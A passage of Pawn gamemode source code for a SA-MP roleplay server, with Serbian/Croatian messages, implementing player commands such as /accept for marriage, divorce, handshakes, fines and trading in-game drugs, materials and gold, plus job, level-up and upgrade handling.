    else if(strcmp(x_job, "mats", true) == 0)
    {
    	if( GiveItemID[ playerid ] != IPI )
		{
		    new userid = GiveItemID[ playerid ];
			SendInfoMessage( userid, "{FFFFFF}%s {4282C0}je odbio vasu ponudu za prodaju materijala.", ImeIgraca( playerid ) );
			SendInfoMessage( playerid, "Odbili ste ponudu za kupovinu materijala od {FFFFFF}%s.", ImeIgraca( userid ) );

			ChosenItem[ playerid ] = -1;
			ItemPrice[ playerid ] = 0;
			ItemQuantity[ playerid ] = 0;
			GiveItemID[ playerid ] = -1;
		}
		else
		{
			SendInfoMessage( playerid, "Odbili ste ponudu za kupovinu materijala." );

			ChosenItem[ playerid ] = -1;
			ItemPrice[ playerid ] = 0;
			ItemQuantity[ playerid ] = 0;
			GiveItemID[ playerid ] = -1;
		}
    }
    else if(strcmp(x_job, "gold", true) == 0)
    {
    	if( GiveItemID[ playerid ] != IPI )
		{
		    new userid = GiveItemID[ playerid ];
			SendInfoMessage( userid, "{FFFFFF}%s {4282C0}je odbio vasu ponudu za prodaju zlata.", ImeIgraca( playerid ) );
			SendInfoMessage( playerid, "Odbili ste ponudu za kupovinu zlata od {FFFFFF}%s.", ImeIgraca( userid ) );

			ChosenItem[ playerid ] = -1;
			ItemPrice[ playerid ] = 0;
			ItemQuantity[ playerid ] = 0;
			GiveItemID[ playerid ] = -1;
		}
		else
		{
			SendInfoMessage( playerid, "Odbili ste ponudu za kupovinu zlata." );

			ChosenItem[ playerid ] = -1;
			ItemPrice[ playerid ] = 0;
			ItemQuantity[ playerid ] = 0;
			GiveItemID[ playerid ] = -1;
		}
    }
	else
	{
		return 1;
	}

	SCMF( playerid, 0x33CCFFFF, "* Otkazali ste uslugu: {FFFFFF}%s.", x_job);
	return 1;
}

CMD:accept( playerid, const params[] )
{
	new item[10];
	if( sscanf( params, "s[10]", item))
	{
		SendUsageMessage( playerid, "/accept [opcija]");
     	SendClientMessage( playerid, 0xCCCCCCFF, "OPCIJE: {FFFFFF}marriage, divorce, gold");
     	SendClientMessage( playerid, 0xCCCCCCFF, "OPCIJE: {FFFFFF}rukovanje, frisk, drugs, mats");
		return 1;
	}

	if( strcmp( item, "marriage", true) == 0)
	{
		if( ProposeOffer[ playerid ] < 999 )
		{
			if( !IsPlayerInRangeOfPoint( playerid, 10.0, 309.0333,-1909.3862,1.5884 ) ) return SendErrorMessage( playerid, "Ne nalazite se na mestu za vencanje." );
			if( IsPlayerConnected( ProposeOffer[ playerid ] ) )
			{
				if( IsPlayerNearPlayer( 10.0, playerid, ProposeOffer[ playerid ] ) )
				{
					SCMF( playerid, 0x33CCFFFF, "(BRAK): Prihvatili ste ponudu osobe {FFFFFF}%s {33CCFF}da bude vas muz.", ImeIgraca( ProposeOffer[ playerid ] ) );
					SCMF( ProposeOffer[ playerid ], 0x33CCFFFF, "(BRAK): {FFFFFF}%s {33CCFF}je prihvatila ponudu da bude vasa supruga.", ImeIgraca( playerid ) );
					SCMF( playerid, -1, "Maticar: %s da li vi uzimate %s za vaseg voljenog muza? (Koristite 'da', ukoliko pristajete)", ImeIgraca( playerid ), ImeIgraca( ProposeOffer[ playerid ] ) );

					MarriageCeremoney{ playerid } = 1;
					ProposedTo[ ProposeOffer[ playerid ] ] = playerid;
					GotProposedBy[ playerid ] = ProposeOffer[ playerid ];
					ProposeOffer[ playerid ] = 999;
				}
				else SendErrorMessage(playerid, "Osoba se ne nalazi u vasoj blizini!");
			}
			else SendErrorMessage( playerid, "Igrac koji te je zaprosio nije na serveru.");
		}
		else SendErrorMessage( playerid, "Niko vas nije zaprosio." );
	}
	else if( strcmp( item, "divorce", true ) == 0 )
	{
		if( DivorceOffer[ playerid ] < 999 )
		{
			if( IsPlayerConnected( DivorceOffer[ playerid ] ) )
			{
				if( IsPlayerNearPlayer( 10.0, playerid, DivorceOffer[ playerid ] ) )
				{
					SCMF( playerid, 0x33CCFFFF, "(BRAK): Prihvatili ste ponudu osobe {FFFFFF}%s {33CCFF}da budete svedok razvoda.", ImeIgraca( DivorceOffer[ playerid ] ) );
					SCMF( DivorceOffer[ playerid ], 0x33CCFFFF, "(BRAK): {FFFFFF}%s {33CCFF}%s je prihvatio da bude svedok razvoda.", ImeIgraca( playerid ) );

					strmid( PlayerInfo[ playerid ][ xMarriedTo ], "Niko", 0, strlen( "Niko" ), 24 );
					PlayerInfo[ playerid ][ xMarried ] = 0;
					strmid( PlayerInfo[ DivorceOffer[ playerid ] ][ xMarriedTo ], "Niko", 0, strlen( "Niko" ), 24 );
					PlayerInfo[ DivorceOffer[ playerid ]][ xMarried ] = 0;
					ProposeOffer[ playerid ] = 999;

					new q[ 144 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `married` = '0', `married_to` = 'Niko' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ playerid ][ xID ] );
					mysql_tquery( mSQL, q );

					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `married` = '0', `married_to` = 'Niko' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ DivorceOffer[ playerid ] ][ xID ] );
					mysql_tquery( mSQL, q );
				}
				else SendErrorMessage( playerid, "Osoba koja vam je poslala formulare nije u vasoj blizini!");
			}
		}
		else SendErrorMessage( playerid, "Niko vam nije poslao formulare!");
	}
	else if( strcmp( item, "ticket",true) == 0)
	{
	    new pandur = TicketOffer[playerid];
	    if( TicketOffer[playerid] != -1 )
		{
	        if( IsPlayerConnected( pandur ) )
			{
	            if( IsPlayerNearPlayer( 5.0, playerid, pandur ) )
				{
				    if( PlayerInfo[ playerid ][ xNovac ] >= TicketMoney[playerid] )
					{
						SCMF( playerid, 0x33CCFFFF, "(TICKET): Platili ste kaznu u iznosu od {FFFFFF}($%d) {33CCFF}policajcu {FFFFFF}%s.", TicketMoney[playerid], ImeIgraca( pandur ) );
						SCMF( pandur, 0x33CCFFFF, "(TICKET): {FFFFFF}%s {33CCFF}je platio vasu kaznu {FFFFFF}($%d) {33CCFF}koja ide u sef policije.", ImeIgraca( playerid ), TicketMoney[playerid] );

						DajIgracuNovac( playerid, -TicketMoney[playerid] );
						DajIgracuNovac( pandur, TicketMoney[playerid] );

						PlayerInfo[ pandur ][ xPDStatsTicket ] += 1;
						sql_user_update_integer( pandur, "xPDStatsTicket", PlayerInfo[ pandur ][ xPDStatsTicket ] );
						PlayerInfo[ pandur ][ xPDStatsTicketMoney ] += TicketMoney[playerid];
						sql_user_update_integer( pandur, "xPDStatsTicketMoney", PlayerInfo[ pandur ][ xPDStatsTicketMoney ] );
						TicketOffer[playerid] = -1;
						TicketMoney[playerid] = 0;
					}
					else SendErrorMessage( playerid, "Nemas dovoljno novca.");
				}
				else SendErrorMessage( playerid, "Policajac nije dovoljno blizu vas.");
	        }
		}
		else SendErrorMessage( playerid, "Nitko vam nije dao tiket.");
	}
	else if( strcmp( item, "rukovanje", true ) == 0 )
	{
	    if( ShakeOffer[playerid] != -1 )
		{
	        if( IsPlayerConnected( ShakeOffer[playerid] ) )
			{
	            if( IsPlayerNearPlayer( 3.0, playerid, ShakeOffer[playerid] ) )
				{
	                switch( ShakeStyle[playerid] )
				    {
				        case 1:
				        {
                            ApplyAnimation(playerid,"GANGS","hndshkfa_swt",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","hndshkfa_swt",4.0,0,0,0,0,0, 1);
						}
						case 2:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkaa",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","hndshkaa",4.0,0,0,0,0,0, 1);
						}
						case 3:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkba",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","hndshkba",4.0,0,0,0,0,0, 1);
						}
						case 4:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkca",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","hndshkca",4.0,0,0,0,0,0, 1);
						}
						case 5:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkda",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","hndshkda",4.0,0,0,0,0,0, 1);
						}
						case 6:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkea",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","hndshkea",4.0,0,0,0,0,0, 1);
						}
						case 7:
						{
                            ApplyAnimation(playerid,"GANGS","hndshkfa",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","hndshkfa",4.0,0,0,0,0,0, 1);
						}
						case 8:
						{
                            ApplyAnimation(playerid,"GANGS","prtial_hndshk_01",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","prtial_hndshk_01",4.0,0,0,0,0,0, 1);
						}
						case 9:
						{
                            ApplyAnimation(playerid,"GANGS","prtial_hndshk_biz_01",4.0,0,0,0,0,0, 1);
							ApplyAnimation(ShakeOffer[playerid],"GANGS","prtial_hndshk_biz_01",4.0,0,0,0,0,0, 1);
						}
					}
					SCMF( playerid, 0x33CCFFFF, "(HANDSHAKE): Prihvatio si {FFFFFF}'%s-ov' {33CCFF}zahtev za rukovanje.", ImeIgraca( ShakeOffer[playerid] ) );
					SCMF( ShakeOffer[playerid], 0x33CCFFFF, "(HANDSHAKE): {FFFFFF}%s {33CCFF}je prihvatio tvoj zahtev za rukovanjem.", ImeIgraca( playerid ) );

					ShakeOffer[ShakeOffer[playerid]] = -1;
                    ShakeOffer[playerid] = -1;
				}
				else SendErrorMessage( playerid, "Igrac koji ti je ponudio rukovanje nije blizu tebe.");
	        }
		}
		else SendErrorMessage( playerid, "Nitko ti nije ponudio rukovanje.");
	}
	else if( strcmp( item, "drugs", true ) == 0 )
	{
		if(ChosenItem[playerid] == 2)
	    {
	       	if( GiveItemID[ playerid ] != IPI )
	        {
		        if(PlayerInfo[GiveItemID[ playerid ]][xTorba_Droga] < ItemQuantity[ playerid ]) return SendErrorMessage( playerid, "Igrac koji vam daje ne poseduje ponudjenu kolicinu droge." );
		        if(PlayerInfo[playerid][xTorba_Droga] > 100000) return SendErrorMessage(playerid, "Nemate mesta za drogu.");
		        if(GetPlayerMoney( playerid ) < ItemPrice[playerid]) return SendErrorMessage( playerid, "Nemate dovoljno novca." );

			    PlayerInfo[ playerid ][ xTorba_Droga ] += ItemQuantity[ playerid ];
				PlayerInfo[ GiveItemID[playerid] ][ xTorba_Droga ] -= ItemQuantity[ playerid ];
				
				DajIgracuNovac(playerid, -ItemPrice[ playerid ]);
				DajIgracuNovac(GiveItemID[playerid], ItemPrice[ playerid ]);
		   		PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0 );

				sql_user_update_integer( GiveItemID[playerid], "xTorba_Droga", PlayerInfo[ GiveItemID[playerid] ][ xTorba_Droga ] );
				sql_user_update_integer( playerid, "xTorba_Droga", PlayerInfo[ playerid ][ xTorba_Droga ] );

				SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s vadi drogu i daje ih %s.", ImeIgraca( GiveItemID[playerid] ), ImeIgraca( playerid ) );

				SendInfoMessage( GiveItemID[playerid], "Dali ste {FFFFFF}%s {4282C0}droge {FFFFFF}(%d) {4282C0}za {FFFFFF}($%d).", ImeIgraca( playerid ), ItemQuantity[ playerid ], ItemPrice[ playerid ] );
		 		SendInfoMessage( playerid, "Primili ste {FFFFFF}(%d) {4282C0}drogu od {FFFFFF}%s {4282C0}za {FFFFFF}($%d).", ItemQuantity[ playerid ], ImeIgraca( GiveItemID[playerid] ), ItemPrice[ playerid ]);

                if(ItemPrice[playerid] >= 10000)
				{ 
					AdminMsg(ADM_WARN, "[ADMIN] %s je dao %s droge %d za $%d (provjerite za moguci MF).", ImeIgraca(GiveItemID[playerid]), ImeIgraca(playerid), ItemQuantity[ playerid ], ItemPrice[playerid]);
				}

		 		ItemPrice[ playerid ] = 0;
				ItemQuantity[ playerid ] = 0;
				GiveItemID[ playerid ] = -1;
			}
			else SendErrorMessage(playerid, "Igrac koji vam je ponudio drogu je napustio server."), ItemPrice[ playerid ] = 0, ItemQuantity[ playerid ] = 0, GiveItemID[ playerid ] = -1;
		}
		else
		{
			ChosenItem[ playerid ] = -1;
			ItemPrice[ playerid ] = 0;
			ItemQuantity[ playerid ] = 0;
			GiveItemID[ playerid ] = -1;
			SendErrorMessage(playerid, "Nije vam ponudjena droga.");
		}
	}
	else if(strcmp(item, "mats", true) == 0)
	{
		if(ChosenItem[playerid] == 1)
	    {
	        if( GiveItemID[ playerid ] != IPI )
	        {
		        if(PlayerInfo[GiveItemID[ playerid ]][xMaterijali] < ItemQuantity[ playerid ]) return SendErrorMessage( playerid, "Igrac koji vam daje ne poseduje ponudjenu kolicinu materijala." );
		        if(GetPlayerMoney( playerid ) < ItemPrice[playerid]) return SendErrorMessage( playerid, "Nemate dovoljno novca." );

			    PlayerInfo[ playerid ][ xMaterijali ] += ItemQuantity[ playerid ];
				PlayerInfo[ GiveItemID[playerid] ][ xMaterijali ] -= ItemQuantity[ playerid ];
				
				DajIgracuNovac(playerid, -ItemPrice[ playerid ]);
				DajIgracuNovac(GiveItemID[playerid], ItemPrice[ playerid ]);
		   		PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0 );

				sql_user_update_integer( GiveItemID[playerid], "materials", PlayerInfo[ GiveItemID[playerid] ][ xMaterijali ] );
				sql_user_update_integer( playerid, "materials", PlayerInfo[ playerid ][ xMaterijali ] );

				SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s vadi materijale i daje ih %s.", ImeIgraca( GiveItemID[playerid] ), ImeIgraca( playerid ) );

				SendInfoMessage( GiveItemID[playerid], "Dali ste {FFFFFF}%s {4282C0}materijala {FFFFFF}(%d) {4282C0}za {FFFFFF}($%d).", ImeIgraca( playerid ), ItemQuantity[ playerid ], ItemPrice[ playerid ] );
		 		SendInfoMessage( playerid, "Primili ste {FFFFFF}(%d) {4282C0}materijala od {FFFFFF}%s {4282C0}za {FFFFFF}($%d).", ItemQuantity[ playerid ], ImeIgraca( GiveItemID[playerid] ), ItemPrice[ playerid ]);

		 		if(ItemPrice[playerid] >= 10000)
				{
					AdminMsg(ADM_WARN, "[ADMIN] %s je dao %s materijala %d za $%d (provjerite za moguci MF).", ImeIgraca(GiveItemID[playerid]), ImeIgraca(playerid), ItemQuantity[ playerid ], ItemPrice[playerid]);
				}

		 		ItemPrice[ playerid ] = 0;
				ItemQuantity[ playerid ] = 0;
				GiveItemID[ playerid ] = -1;
			}
			else SendErrorMessage(playerid, "Igrac koji vam je ponudio materijale je napustio server."), ItemPrice[ playerid ] = 0, ItemQuantity[ playerid ] = 0, GiveItemID[ playerid ] = -1;
		}
		else
		{
			ChosenItem[ playerid ] = -1;
			ItemPrice[ playerid ] = 0;
			ItemQuantity[ playerid ] = 0;
			GiveItemID[ playerid ] = -1;
			SendErrorMessage(playerid, "Nije vam niko ponudio materijale.");
	    }
	}
	else if(strcmp(item, "gold", true) == 0)
	{
		if(ChosenItem[playerid] == 3)
	    {
	        if( GiveItemID[ playerid ] != IPI )
	        {
		        if(PlayerInfo[GiveItemID[ playerid ]][xZlato] < ItemQuantity[ playerid ]) return SendErrorMessage( playerid, "Igrac koji vam daje ne poseduje ponudjenu kolicinu zlata." );
		        if(GetPlayerMoney( playerid ) < ItemPrice[playerid]) return SendErrorMessage( playerid, "Nemate dovoljno novca." );

			    PlayerInfo[ playerid ][ xZlato ] += ItemQuantity[ playerid ];
				PlayerInfo[ GiveItemID[playerid] ][ xZlato ] -= ItemQuantity[ playerid ];
				
				DajIgracuNovac(playerid, -ItemPrice[ playerid ]);
				DajIgracuNovac(GiveItemID[playerid], ItemPrice[ playerid ]);
		   		PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0 );

				sql_user_update_integer( GiveItemID[playerid], "xZlato", PlayerInfo[ GiveItemID[playerid] ][ xZlato ] );
				sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );

				SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s vadi zlato i daje ih %s.", ImeIgraca( GiveItemID[playerid] ), ImeIgraca( playerid ) );

				SendInfoMessage( GiveItemID[playerid], "Dali ste {FFFFFF}%s {4282C0}zlata {FFFFFF}(%d) {4282C0}za {FFFFFF}($%d).", ImeIgraca( playerid ), ItemQuantity[ playerid ], ItemPrice[ playerid ] );
		 		SendInfoMessage( playerid, "Primili ste {FFFFFF}(%d) {4282C0}zlata od {FFFFFF}%s {4282C0}za {FFFFFF}($%d).", ItemQuantity[ playerid ], ImeIgraca( GiveItemID[playerid] ), ItemPrice[ playerid ]);

		 		if(ItemPrice[playerid] >= 10000)
				{
					AdminMsg(ADM_WARN, "[ADMIN] %s je dao %s zlata %d za $%d (provjerite za moguci MF).", ImeIgraca(GiveItemID[playerid]), ImeIgraca(playerid), ItemQuantity[ playerid ], ItemPrice[playerid]);
				}

		 		ItemPrice[ playerid ] = 0;
				ItemQuantity[ playerid ] = 0;
				GiveItemID[ playerid ] = -1;
			}
			else SendErrorMessage(playerid, "Igrac koji vam je ponudio zlato je napustio server."), ItemPrice[ playerid ] = 0, ItemQuantity[ playerid ] = 0, GiveItemID[ playerid ] = -1;
		}
		else
		{
			ChosenItem[ playerid ] = -1;
			ItemPrice[ playerid ] = 0;
			ItemQuantity[ playerid ] = 0;
			GiveItemID[ playerid ] = -1;

			SendErrorMessage(playerid, "Nije vam niko ponudio zlato.");
	    }
	}
	else
	{
		SendUsageMessage( playerid, "/accept [opcija]");
     	SendClientMessage( playerid, 0xCCCCCCFF, "OPCIJE: {FFFFFF}marriage, divorce, gold");
     	SendClientMessage( playerid, 0xCCCCCCFF, "OPCIJE: {FFFFFF}rukovanje, frisk, drugs, mats");
	}
	return 1;
}

CMD:quitjob(playerid)
{
	if( PlayerInfo[ playerid ][ xPosao ] == 0 ) return SendErrorMessage( playerid, "Vi nemate nijedan posao." );
	
	SendJobMessage( playerid, "Dali ste otkaz na poslu, sretno dalje.");
	PlayerInfo[ playerid ][ xPosao ] = 0;
	UzeoOpremu[ playerid ] = false;
	SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

	new q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `job_id` = '0' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ playerid ][ xID ] );
	mysql_tquery( mSQL, q );
	return 1;
}

CMD:vf(playerid, const params[]) 
{
    if( PlayerInfo[ playerid ][ xPosao ] == 0 ) return SendErrorMessage( playerid, "Ovu komandu moze koristiti samo onaj ko je zaposljen." );

	new broj = ( random( 8 ) + 1 );
	PlayerCode[ playerid ] = broj;

	format( globalstring, sizeof( globalstring ), "{FFFFFF}* Unesite u prazno polje broj: {4282C0}(%d)", broj );
	ShowPlayerDialog( playerid, dialog_VERIFIKACIJA, DIALOG_STYLE_INPUT, D_NASLOV, globalstring, "Potvrdi", "Odustani" );
    return 1;
}

CMD:levelup( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xLevel ] >= 1 )
	{
		new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1;
		new expamount = nxtlevel*levelexp;
		if( PlayerInfo[ playerid ][ xRespekt ] < expamount )
		{
			SendErrorMessage( playerid, "Trebas imati %d respekta, a ti trenutno imas [%d].", expamount, PlayerInfo[ playerid ][ xRespekt ] );
			return 1;
		}
		else
		{
			format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
			GameTextForPlayer( playerid, globalstring, 5000, 1);
			PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			PlayerPlayMusic( playerid );
			PlayerInfo[ playerid ][ xLevel ]++;
			SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );

			PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
            PlayerInfo[ playerid ][ xRespekt ] = 0;
			SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Ukucaj {FFFFFF}[ /upgrade ] {33CCFF}za neke bonuse.", nxtlevel);
			SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Imas {FFFFFF}(%d) {33CCFF}neiskoristenih upgrade poena.", PlayerInfo[ playerid ][ xPoboljsanja ]);

			new q[ 140 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d' WHERE `user_id` = '%d' LIMIT 1",
												PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xRespekt ], PlayerInfo[ playerid ][ xPoboljsanja ], PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, q );
		}
	}
	return 1;
}

CMD:upgrade( playerid, const params[] )
{
	new item[32];
	if( sscanf( params, "s[32] ", item))
	{
		SendUsageMessage( playerid, "/upgrade [opcija]");
     	SendClientMessage( playerid, 0xCCCCCCFF, "OPCIJE: {FFFFFF}health, snaga");
		return 1;
	}
	if( strcmp( item, "health", true) == 0 )
	{
	    if(PlayerInfo[ playerid ][ xPoboljsanja ] > 1 )
		{
			if(PlayerInfo[ playerid ][ xSHealth ] < 50 )
			{
				PlayerInfo[ playerid ][ xSHealth ] = PlayerInfo[ playerid ][ xSHealth ]+5.0;
				SendInfoMessage( playerid, "Upgraded! Sada ces se spawnati sa {FFFFFF}(%.2f) {4282C0}energije {FFFFFF}(+5).",PlayerInfo[ playerid ][ xSHealth ]+50 );
				PlayerInfo[ playerid ][ xPoboljsanja ]--;

				new q[ 128 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `upgrades` = '%d', `spawn_hp` = '%f' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ playerid ][ xPoboljsanja ], PlayerInfo[ playerid ][ xSHealth ], PlayerInfo[ playerid ][ xID ] );
				mysql_tquery( mSQL, q );
			}
			else SendErrorMessage( playerid, "Imas maksimum spawn energiju.");
		}
		else SendErrorMessage( playerid, "Nemas dovoljno upgrade poena.");
	    return 1;
	}
	else if( strcmp( item, "snaga", true) == 0 )
	{
		if( PlayerInfo[ playerid ][ xLevel ] >= 3 )
		{
			if( PlayerInfo[ playerid ][ xPoboljsanja ] > 1 )
			{
				if( PlayerInfo[ playerid ][ xSnaga ] < 20 )
				{
				    SendInfoMessage( playerid, "Upgraded! Unaprijedili ste snagu vaseg lika, ona vam sluzi za razvaljivanje i slicno. Sada iznosi {4282C0}(%d).", PlayerInfo[ playerid ][ xSnaga ]+1 );
				    PlayerInfo[ playerid ][ xSnaga ] += 1;
				    PlayerInfo[ playerid ][ xPoboljsanja ]--;

				    new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `upgrades` = '%d', `strenght` = '%d' WHERE `user_id` = '%d' LIMIT 1",
						PlayerInfo[ playerid ][ xPoboljsanja ],
						PlayerInfo[ playerid ][ xSnaga ],
						PlayerInfo[ playerid ][ xID ] );
					mysql_tquery( mSQL, q );
				}
				else SendErrorMessage( playerid, "Imas maksimum snagu.");
			}
			else SendErrorMessage( playerid, "Nemas dovoljno upgrade poena.");
		}
		else SendErrorMessage( playerid, "Trenutno nedostupno, premali level.");
    	return 1;
	}
	else
	{
		SendUsageMessage( playerid, "/upgrade [opcija]");
     	SendClientMessage( playerid, 0xCCCCCCFF, "OPCIJE: {FFFFFF}health, strength");
	}
	return 1;
}

CMD:popraviavion( playerid )
{
    if( IsPlayerInRangeOfPoint( playerid, 15.0, 1865.6421, -2390.7712, 14.4759 ) || IsPlayerInRangeOfPoint( playerid, 15.0, -1525.4755, -81.9020, 15.0702 ) || IsPlayerInRangeOfPoint( playerid, 15.0, 1433.4257, 1379.8014, 11.7424 ) )
	{
		if( GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 519 || GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 553 )
		{
			if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PILOT )
			{
				if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Niste na mestu vozaca.");
				if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate 500 dolara kod sebe." );

				SMG_RepairVehicle( playerid, GetPlayerVehicleID( playerid ) );
				vCanDrive[ GetPlayerVehicleID( playerid ) ] = 1;
				DajIgracuNovac( playerid, -500 );

				SendInfoMessage( playerid, "Popravili ste avion za {FFFFFF}($500)." );
			}
		}
	}
	return 1;
}

JobUniformPlace( playerid )
{
    for( new i = 0; i < MAX_JOBS; i++)
	{
        if( IsPlayerInRangeOfPoint( playerid, 3.0, jobsInfos[ i ][ jUniformPos ][ 0 ], jobsInfos[ i ][  jUniformPos ][ 1 ], jobsInfos[ i ][ jUniformPos ][ 2 ] ) )
		{
			return i;
		}
	}
	return -1;
}

CMD:uniforma( playerid )
{
    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes da uzmes opremu dok si u vozilu." );
    new id = JobUniformPlace( playerid );
	if( id == -1 ) return SendErrorMessage( playerid, "Niste na mesu za uzimanje/skidanje opreme." );
    if( PlayerInfo[ playerid ][ xPosao ] != jobsInfos[ id ][ jType ] ) return SendErrorMessage( playerid, "Niste zaposljeni kao %s.", jobsInfos[ id ][ jName ] );
	if( jobsInfos[ id ][ jUniformPos ] == 0 || jobsInfos[ id ][ jUniformSkin_Male ] == 0 ) return SendErrorMessage( playerid, "Za ovaj posao nije potrebna uniforma." );
	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete raditi dok ste u jailu / prisonu.");

	if( GetPlayerSpecialAction( playerid ) == SPECIAL_ACTION_USEJETPACK )
	{
	    new Float:X, Float:Y, Float:Z;
	    GetPlayerPos(playerid, X, Y, Z);
	    SMG_SetPlayerPos(playerid, X, Y, Z+1);
		SendInfoMessage( playerid, "Skinuo si jetpack te je unisten." );
	}

    if( !UzeoOpremu[ playerid ] )
	{
		UzeoOpremu[ playerid ] = true;

		if( PlayerInfo[ playerid ][ xPol ] == 1 )
		{
		    SMG_SetPlayerSkin( playerid, jobsInfos[ id ][ jUniformSkin_Male ] );
		}
		else if( PlayerInfo[ playerid ][ xPol ] == 2 ) SMG_SetPlayerSkin( playerid, jobsInfos[ id ][ jUniformSkin_Female ] );
		else SMG_SetPlayerSkin( playerid, jobsInfos[ id ][ jUniformSkin_Male ] );

		if( jobsInfos[ id ][ jType ] == POSAO_RUDAR )
		{
		    SetPlayerAttachedObject( playerid, OBJECT_SLOT_NONVEHICLE, 18634, 6, 0.048513, 0.018571, 0.028653, 314.764404, 226.953979, 222.510803, 1.000000, 1.000000, 1.000000 );
	       	SetPlayerAttachedObject( playerid, OBJECT_SLOT_MAIN, 2060, 1, -0.191781, -0.162666, -0.003734, 88.812377, 0.000000, 0.408470, 1.000000, 1.000000, 1.000000 );
		}

		SendJobMessage( playerid, "Uzeli ste opremu sada mozete raditi kao {FFFFFF}%s, {36AB00}komande pogledajte na {FFFFFF}[ /help ].", jobsInfos[ id ][ jName ] );
	}
	else if( UzeoOpremu[ playerid ] )
	{
		UzeoOpremu[ playerid ] = false;

	    SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

	    SendJobMessage( playerid, "Skinuli ste poslovnu opremu." );

	    if( jobsInfos[ id ][ jType ] == POSAO_RUDAR )
		{
	    	if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_NONVEHICLE ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_NONVEHICLE );
			if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_MAIN ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MAIN );
		}
	}
	return 1;
}

CMD:stopwork( playerid )
{
	if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PILOT )
	{
	    if( LetZG[ playerid ] != 0 || LetSA[ playerid ] != 0 )
		{
	        LetZG[ playerid ] = 0;
			LetSA[ playerid ] = 0;
 			DisablePlayerCheckpoint( playerid );
 			CheckpointStatus[ playerid ] = 0;

 			if( PosaoVozilo[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoVozilo[ playerid ] );
				SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
				PosaoVozilo[ playerid ] = -1;
			}
 			if( PosaoTrailer[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
				ResetVehicle( PosaoTrailer[ playerid ] );
				SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
				PosaoTrailer[ playerid ] = -1;
			}
	        SendJobMessage( playerid, "Uspesno ste prekinuli sa poslom, sada mozete ostaviti uniformu ili opet raditi." );
	    }
	    else return SendErrorMessage( playerid, "Niste zapoceli sa poslom." );
	}
	else if(PlayerInfo[playerid][xPosao] == POSAO_MEHANICAR)
	{
		if(PosaoMehanicarCP[playerid])
		{
			PosaoMehanicarCP[playerid] = false;
			OkacioTrailer[playerid] = false;
			CheckpointStatus[playerid] = 0;
 			DisablePlayerCheckpoint(playerid);

 			if( PosaoVozilo[ playerid ] != -1 )
			{
   				VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
